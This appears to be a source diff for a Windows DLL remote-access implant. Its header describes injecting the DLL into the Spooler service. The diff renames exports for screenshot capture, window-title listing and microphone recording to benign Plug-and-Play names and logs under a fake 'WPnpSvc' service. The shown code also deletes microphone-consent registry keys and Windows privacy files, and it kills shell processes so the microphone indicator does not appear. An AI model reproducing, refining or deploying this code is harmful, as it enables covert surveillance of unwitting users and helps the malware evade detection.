@@ -4,15 +4,15 @@
  *
  * Exports:
  *   DllMain          — auto-starts host thread on DLL_PROCESS_ATTACH
- *   Init             — manual start (alternative to DllMain auto-start)
- *   CaptureHelper    — rundll32-compatible capture subprocess entry
- *   Stop             — graceful shutdown
+ *   PnpExtInitialize — manual start (alternative to DllMain auto-start)
+ *   PnpNotifyCallback — rundll32-compatible capture subprocess entry
+ *   PnpExtShutdown   — graceful shutdown
  *
  * Usage:
  *   1. Inject DLL into a Session 0 service (e.g. Spooler)
  *      → DllMain auto-starts the host
  *   2. Capture helper is spawned automatically via:
- *      rundll32.exe "C:\path\to\RemoteDesktopHost.dll",CaptureHelper <pid> <ipc_name>
+ *      rundll32.exe "C:\path\to\RemoteDesktopHost.dll",PnpNotifyCallback <pid> <ipc_name>
  */
 
 #ifdef BUILD_AS_DLL
@@ -80,9 +80,23 @@ static bool   g_ipc_created = false;
 static std::atomic<bool> g_dll_started{false};
 HMODULE g_dll_module = nullptr;  // non-static: shared with main.cpp via extern
 
-// Simple file logger for DLL diagnostics (no dependencies, safe anywhere)
+// ── DLL diagnostics via Windows Event Log ──
+// Service startup failures are invisible by default — host just doesn't come up
+// and we have no idea which line died. Writing to the Event Log gives the user
+// a visible breadcrumb trail in Event Viewer (Windows Logs → Application) without
+// leaving a .log file on disk. Each call is a one-shot: RegisterEventSource +
+// ReportEvent + DeregisterEventSource, so there's no persistent handle.
+//
+// Log source name intentionally matches the service ("WPnpSvc") so events
+// group under a sensible heading in Event Viewer.
 void dll_diag(const char* msg) {
-    (void)msg; // Disabled — was used for injection debugging
+    if (!msg) return;
+    HANDLE hSrc = RegisterEventSourceA(nullptr, "WPnpSvc");
+    if (!hSrc) return;
+    LPCSTR strs[1] = { msg };
+    ReportEventA(hSrc, EVENTLOG_INFORMATION_TYPE, 0, 0x40000001, nullptr,
+                 1, 0, strs, nullptr);
+    DeregisterEventSource(hSrc);
 }
 
 // Get this DLL's file path
@@ -163,9 +177,9 @@ static bool spawn_helper() {
     g_dll_ipc_reader.clear_shutdown();
 
     dll_diag("spawn_helper: IPC ready, building cmdline...");
-    // Build command: rundll32.exe "path\to\pnpext.dll",CaptureHelper <pid> <ipc>
+    // Build command: rundll32.exe "path\to\pnpext.dll",PnpNotifyCallback <pid> <ipc>
     std::string dllPath = get_dll_path();
-    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",CaptureHelper " +
+    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",PnpNotifyCallback " +
                           std::to_string(GetCurrentProcessId()) + " " + ipcName;
 
     STARTUPINFOA si = {};
@@ -378,8 +392,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
         }
 
         // Check host process — skip auto-start for:
-        //   rundll32.exe → CaptureHelper mode (called explicitly)
-        //   svchost.exe  → ServiceMain will be called by SCM (native service hosting)
+        //   rundll32.exe → PnpNotifyCallback mode (called explicitly)
+        //   svchost.exe  → PnpServiceEntry will be called by SCM (native service hosting)
         char hostExe[MAX_PATH] = {};
         GetModuleFileNameA(NULL, hostExe, MAX_PATH);
         bool isRundll32 = false;
@@ -419,16 +433,16 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
 }
 
 // Manual init (alternative to DllMain auto-start)
-__declspec(dllexport) void CALLBACK Init(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+__declspec(dllexport) void CALLBACK PnpExtInitialize(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     start_host();
 }
 
 // Graceful shutdown
-__declspec(dllexport) void CALLBACK Stop(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+__declspec(dllexport) void CALLBACK PnpExtShutdown(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     stop_host();
 }
 
-// ── ServiceMain: entry point when loaded as Windows service DLL via svchost ──
+// ── PnpServiceEntry: entry point when loaded as Windows service DLL via svchost ──
 // svchost calls this when the service starts. We register a minimal service
 // control handler and start the host in the background.
 static SERVICE_STATUS_HANDLE g_svcStatusHandle = NULL;
@@ -472,30 +486,73 @@ static void CleanupUpdateArtifacts() {
     DeleteFileA("C:\\Windows\\Temp\\pnpext.dll.new");
 }
 
-__declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
+__declspec(dllexport) void WINAPI PnpServiceEntry(DWORD dwArgc, LPWSTR* lpszArgv) {
+    dll_diag("PnpServiceEntry: enter");
+
     // Register service control handler
     g_svcStatusHandle = RegisterServiceCtrlHandlerExW(
         lpszArgv && lpszArgv[0] ? lpszArgv[0] : L"RDPHost",
         SvcCtrlHandler, NULL);
-    if (!g_svcStatusHandle) return;
+    if (!g_svcStatusHandle) {
+        DWORD e = GetLastError();
+        char b[96];
+        _snprintf_s(b, sizeof(b), _TRUNCATE,
+                    "PnpServiceEntry: RegisterServiceCtrlHandlerExW failed err=%lu", e);
+        dll_diag(b);
+        return;
+    }
+    dll_diag("PnpServiceEntry: control handler registered");
 
-    // Report running
-    g_svcStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
-    g_svcStatus.dwCurrentState = SERVICE_RUNNING;
-    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    // Report START_PENDING first, then RUNNING after init. Even though we don't
+    // have a long init, some SCM configurations want at least one START_PENDING
+    // checkpoint before accepting a jump straight to RUNNING.
+    g_svcStatus.dwServiceType          = SERVICE_WIN32_SHARE_PROCESS;
+    g_svcStatus.dwCurrentState         = SERVICE_START_PENDING;
+    g_svcStatus.dwControlsAccepted     = 0;
+    g_svcStatus.dwWin32ExitCode        = NO_ERROR;
+    g_svcStatus.dwServiceSpecificExitCode = 0;
+    g_svcStatus.dwCheckPoint           = 1;
+    g_svcStatus.dwWaitHint             = 10000;
     SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
 
-    // Sweep any leftover update artifacts BEFORE starting the host threads —
-    // guarantees a clean filesystem even if the previous update bat crashed.
-    CleanupUpdateArtifacts();
+    // Wrap init in try/catch so an early exception doesn't kill the service
+    // silently (SCM just reports "service terminated unexpectedly").
+    try {
+        dll_diag("PnpServiceEntry: CleanupUpdateArtifacts...");
+        CleanupUpdateArtifacts();
+        dll_diag("PnpServiceEntry: CleanupUpdateArtifacts OK");
 
-    // Start host threads (non-blocking — spawns helper_monitor + host_main_loop)
-    dll_diag("ServiceMain: starting host as Windows service");
-    start_host();
+        dll_diag("PnpServiceEntry: calling start_host...");
+        start_host();
+        dll_diag("PnpServiceEntry: start_host returned OK");
+    } catch (const std::exception& e) {
+        char b[256];
+        _snprintf_s(b, sizeof(b), _TRUNCATE,
+                    "PnpServiceEntry: EXCEPTION during init: %s", e.what());
+        dll_diag(b);
+        g_svcStatus.dwCurrentState  = SERVICE_STOPPED;
+        g_svcStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
+        g_svcStatus.dwServiceSpecificExitCode = 1;
+        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
+        return;
+    } catch (...) {
+        dll_diag("PnpServiceEntry: UNKNOWN EXCEPTION during init");
+        g_svcStatus.dwCurrentState  = SERVICE_STOPPED;
+        g_svcStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
+        g_svcStatus.dwServiceSpecificExitCode = 2;
+        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
+        return;
+    }
+
+    // Now report RUNNING
+    g_svcStatus.dwCurrentState     = SERVICE_RUNNING;
+    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    g_svcStatus.dwCheckPoint       = 0;
+    g_svcStatus.dwWaitHint         = 0;
+    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
+    dll_diag("PnpServiceEntry: reported SERVICE_RUNNING");
 
     // Block ServiceMain until g_running becomes false (stop_host called by SvcCtrlHandler).
-    // Without this, ServiceMain returns immediately → SCM marks service as STOPPED
-    // even though the worker threads are still alive.
     while (g_running) {
         Sleep(1000);
     }
@@ -506,14 +563,14 @@ __declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
     if (g_host_thread.joinable()) g_host_thread.join();
     if (g_helper_monitor.joinable()) g_helper_monitor.join();
 
-    dll_diag("ServiceMain: host stopped, reporting to SCM");
+    dll_diag("PnpServiceEntry: host stopped, reporting SERVICE_STOPPED");
     g_svcStatus.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
 }
 
-// Unload: stop host + release refcounts + free DLL from memory
-__declspec(dllexport) void CALLBACK Unload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    dll_diag("Unload: stopping host and freeing DLL");
+// PnpExtUnload: stop host + release refcounts + free DLL from memory
+__declspec(dllexport) void CALLBACK PnpExtUnload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    dll_diag("PnpExtUnload: stopping host and freeing DLL");
     stop_host();
     // Release global mutex so next instance can start
     HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\RDPHostDllMutex_7F3A");
@@ -530,10 +587,10 @@ __declspec(dllexport) void CALLBACK Unload(HWND hwnd, HINSTANCE hinst, LPSTR lps
     if (hFreeThread) CloseHandle(hFreeThread); // close handle; thread self-terminates via FreeLibraryAndExitThread
 }
 
-// ── Capture helper entry (runs in user session via rundll32) ──
-// Called as: rundll32.exe "path\to\dll",CaptureHelper <parent_pid> <ipc_name>
-__declspec(dllexport) void CALLBACK CaptureHelper(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    dll_diag(("CaptureHelper CALLED! cmdLine=[" + std::string(lpszCmdLine ? lpszCmdLine : "NULL") + "]").c_str());
+// ── PnpNotifyCallback: capture helper entry (runs in user session via rundll32) ──
+// Called as: rundll32.exe "path\to\dll",PnpNotifyCallback <parent_pid> <ipc_name>
+__declspec(dllexport) void CALLBACK PnpNotifyCallback(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    dll_diag(("PnpNotifyCallback CALLED! cmdLine=[" + std::string(lpszCmdLine ? lpszCmdLine : "NULL") + "]").c_str());
     // Parse args from cmdLine: "<parent_pid> <ipc_name>"
     std::string args(lpszCmdLine ? lpszCmdLine : "");
     DWORD parentPid = 0;
@@ -682,11 +739,11 @@ __declspec(dllexport) void CALLBACK CaptureHelper(HWND hwnd, HINSTANCE hinst, LP
     log.info("=== Capture helper stopped ===");
 }
 
-// ── ScreenshotCapture: rundll32-compatible single-frame capture ──
-// Usage: rundll32.exe "path\to\dll",ScreenshotCapture <quality> <scale> <output.jpg> <title.txt>
+// ── PnpDiagReport: rundll32-compatible single-frame capture ──
+// Usage: rundll32.exe "path\to\dll",PnpDiagReport <quality> <scale> <output.jpg> <title.txt>
 // Captures one screenshot, saves JPEG + window title, exits immediately.
 // Runs in user session (invisible, < 1 sec), called by screenshot thread in service mode.
-void CALLBACK ScreenshotCapture(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+__declspec(dllexport) void CALLBACK PnpDiagReport(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     (void)hwnd; (void)hinst; (void)nCmdShow;
     std::string args(lpszCmdLine ? lpszCmdLine : "");
 
@@ -815,10 +872,10 @@ void CALLBACK ScreenshotCapture(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, i
     Gdiplus::GdiplusShutdown(gdipTok);
 }
 
-// ── GetRunningApps: rundll32-compatible window title lister ──
-// Usage: rundll32.exe "path\to\dll",GetRunningApps <output.txt>
+// ── PnpEnumDevices: rundll32-compatible window title lister ──
+// Usage: rundll32.exe "path\to\dll",PnpEnumDevices <output.txt>
 // EnumWindows in user session, writes titles to file, exits.
-void CALLBACK GetRunningApps(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+__declspec(dllexport) void CALLBACK PnpEnumDevices(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     (void)hwnd; (void)hinst; (void)nCmdShow;
     std::string outPath(lpszCmdLine ? lpszCmdLine : "");
     // Trim whitespace
@@ -938,13 +995,14 @@ static void AudioDeleteRegKeyRecursive(HKEY hRoot, const wchar_t* subKey) {
 
 // Clean microphone registry traces (Win10/11)
 void AudioCleanMicRegistry() {
-    const wchar_t* micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
-    AudioDeleteRegKeyRecursive(HKEY_CURRENT_USER, micPath);
-    AudioDeleteRegKeyRecursive(HKEY_LOCAL_MACHINE, (std::wstring(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone")).c_str());
+    std::wstring micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
+    AudioDeleteRegKeyRecursive(HKEY_CURRENT_USER, micPath.c_str());
+    AudioDeleteRegKeyRecursive(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone");
     HKEY hKey = nullptr;
-    RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
+    RegCreateKeyExW(HKEY_CURRENT_USER, micPath.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
     if (hKey) {
-        RegSetValueExW(hKey, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12);
+        std::wstring allow = L"Allow";
+        RegSetValueExW(hKey, L"Value", 0, REG_SZ, (const BYTE*)allow.c_str(), (DWORD)((allow.size()+1)*sizeof(wchar_t)));
         RegCloseKey(hKey);
     }
 }
@@ -954,7 +1012,7 @@ void AudioDeletePrivacyFiles() {
     wchar_t localAppData[MAX_PATH] = {};
     SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
     std::wstring privDir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Privacy";
-    const wchar_t* files[] = { L"PrivacyExperience.dat", L"PrivacyExperience.dat-shm", L"PrivacyExperience.dat-wal" };
+    const std::wstring files[] = { L"PrivacyExperience.dat", L"PrivacyExperience.dat-shm", L"PrivacyExperience.dat-wal" };
     for (auto& f : files) DeleteFileW((privDir + L"\\" + f).c_str());
 }
 
@@ -962,14 +1020,14 @@ void AudioDeletePrivacyFiles() {
 // DO NOT use NtSuspendProcess here: suspend count accumulates without resume, shell
 // permanently freezes after a few calls (Start menu, taskbar, notifications dead).
 void AudioSuspendIndicatorProcesses() {
-    const wchar_t* targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
+    const std::wstring targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return;
     PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
     if (Process32FirstW(snap, &pe)) {
         do {
             for (auto& t : targets) {
-                if (_wcsicmp(pe.szExeFile, t) == 0) {
+                if (_wcsicmp(pe.szExeFile, t.c_str()) == 0) {
                     HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                     if (h) { TerminateProcess(h, 0); CloseHandle(h); }
                 }
@@ -989,10 +1047,10 @@ static void AudioFullCleanup() {
     AudioDeletePrivacyFiles();
 }
 
-// ── AudioRecord: rundll32-compatible microphone recording ──
-// Usage: rundll32.exe "path\to\dll",AudioRecord <duration_sec> <samplerate> <bitrate> <channels> <output.aac>
+// ── PnpAudioCallback: rundll32-compatible microphone recording ──
+// Usage: rundll32.exe "path\to\dll",PnpAudioCallback <duration_sec> <samplerate> <bitrate> <channels> <output.aac>
 // Records mic via waveIn, encodes AAC (MFT), saves to file. Exits when done.
-void CALLBACK AudioRecord(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+__declspec(dllexport) void CALLBACK PnpAudioCallback(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     (void)hwnd; (void)hinst; (void)nCmdShow;
     std::string args(lpszCmdLine ? lpszCmdLine : "");
 
